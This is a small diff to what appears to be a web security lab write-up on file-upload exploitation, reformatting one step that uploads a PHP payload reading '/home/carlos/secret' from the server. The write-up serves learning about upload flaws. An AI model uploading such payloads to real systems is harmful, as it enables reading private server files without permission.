@@ -16,7 +16,8 @@ First we have to login as the specified user password. When you upload your imag
 
 #### 2. Discovery & Exploitation
 
-*   **Step 1:** Upload the same shellcode which worked on the previous labs and send the `POST` request to the repeater
+*   **Step 1:** 
+Upload the same shellcode which worked on the previous labs and send the `POST` request to the repeater
 ```
 <?php echo file_get_contents('/home/carlos/secret'); ?>
 ```
